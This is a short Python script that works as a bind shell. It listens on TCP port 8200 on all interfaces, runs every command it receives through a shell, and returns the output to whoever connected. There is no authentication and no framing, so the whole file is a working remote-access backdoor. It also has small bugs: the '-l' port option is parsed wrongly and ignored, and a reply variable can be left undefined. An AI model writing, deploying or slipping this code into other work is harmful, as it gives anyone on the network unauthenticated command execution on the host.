import subprocess , socket, getopt, sys


def main():
    (option, value) = getopt.getopt(sys.argv[1:], "l")
    for (opts, arg) in option:
        if opts == "-l":
            port = arg
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = ""
    port = 8200
    s.bind((host, port))
    s.listen(5)
    print("SERVER LISTENING ...")
    clientsocket, addr = s.accept()

    while True:
        data = clientsocket.recv(1024)
        if data.decode('ascii') == 'exit':
            clientsocket.send('Finished'.encode('ascii'))
            break
        print("Address: %s " % str(addr))
        print("\nReceived correctly: " + data.decode("ascii"))
        result = subprocess.Popen([data], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        stdout, stderr = result.communicate()
        if stdout != "":
            msg = "OK\n"+stdout
        elif stderr != "":
            msg = "ERROR\n"+stderr

        clientsocket.send(msg.encode())


main()
